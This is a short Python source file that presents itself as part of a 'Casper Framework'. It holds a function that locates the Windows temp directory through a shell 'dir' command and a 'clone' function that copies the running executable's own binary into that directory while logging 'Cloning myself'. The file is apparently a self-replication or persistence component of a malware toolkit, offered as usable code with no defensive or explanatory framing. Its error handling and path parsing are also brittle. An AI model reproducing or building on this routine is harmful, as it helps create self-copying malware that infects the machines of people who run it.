"""
Part of Casper Framework
"""
from imports import *

def temp_directory():
	"""
	look for the temp directory
	"""
	logging.debug("[casper] Looking for temp directory")
	
	try:
		process_create = os.popen('dir %temp% | findstr ":\"')
		process_result = process_create.read()
	except Exception as e:
		logging.debug("[casper] Error, creating/reading process > {}".format(e))

	if process_result:
		temp_dir = os.path.splitdrive(process_result)[1].split()
		return temp_dir[2]
	else:
		logging.debug("[casper] Error, couldn't find temp directory")
	
def clone(self):
	"""
	read the binary data of given executable and saves it
	in the temp directory
	"""
	logging.debug("[casper] Cloning myself, please wait")
	
	try:
		with open(self, "rb") as clone_file:
			byte = clone_file.read()
	except Exception as e:
		logging.debug("[casper] Error, cannot read binary data > {}".format(e))

	try:
		file = open(os.path.join(temp_directory(),self),"wb")
		file.write(byte)
		file.close()
		logging.debug("[casper] Cloning finished")
		return True
	except Exception as e:
		logging.debug("[casper] Error, cannot write file on disk > {}".format(e))